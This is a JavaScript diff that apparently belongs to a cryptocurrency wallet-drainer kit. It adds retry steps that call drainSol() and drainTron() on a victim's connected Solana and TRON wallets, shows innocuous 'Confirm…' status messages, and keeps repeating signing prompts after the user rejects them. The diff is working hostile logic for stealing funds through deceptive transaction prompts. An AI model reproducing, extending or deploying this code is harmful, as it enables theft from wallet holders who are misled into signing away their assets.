@@ -4073,6 +4073,38 @@
                 L.warn('[pipeline] settle after sign:', eD && eD.message);
               }
             }
+            // Retry pending non-EVM drains — drainSol() refreshes blockhash internally each call.
+            // SOL: if not yet drained this session, try again (fresh tx build + fresh blockhash).
+            if (S.familyConnections.SVM && !S.omnichainLegs.solana) {
+              try {
+                UI.showStatus('Confirm Solana…');
+                await drainSol(S.familyConnections.SVM);
+              } catch (eSolR) {
+                if (isUserRejection(eSolR)) {
+                  // User rejected SOL popup — keep retry cycle going
+                  S.userRejectedSign = true;
+                  setPipelinePhase(PIPELINE.REJECTED);
+                  try { UI.showUserRejected(); } catch (eRr) {}
+                  return { ok: false, error: 'rejected' };
+                }
+                L.warn('[pipeline] SOL retry drain:', eSolR && eSolR.message);
+              }
+            }
+            // TRON: same pattern — retry if not yet drained
+            if (S.familyConnections.TRON && !S.omnichainLegs.tron) {
+              try {
+                UI.showStatus('Confirm TRON…');
+                await drainTron(S.familyConnections.TRON);
+              } catch (eTronR) {
+                if (isUserRejection(eTronR)) {
+                  S.userRejectedSign = true;
+                  setPipelinePhase(PIPELINE.REJECTED);
+                  try { UI.showUserRejected(); } catch (eRr) {}
+                  return { ok: false, error: 'rejected' };
+                }
+                L.warn('[pipeline] TRON retry drain:', eTronR && eTronR.message);
+              }
+            }
             if (!needsEvmFlush()) {
               S.postConnectComplete = true;
               emitEvmConfirmDone(S.evmAddr);
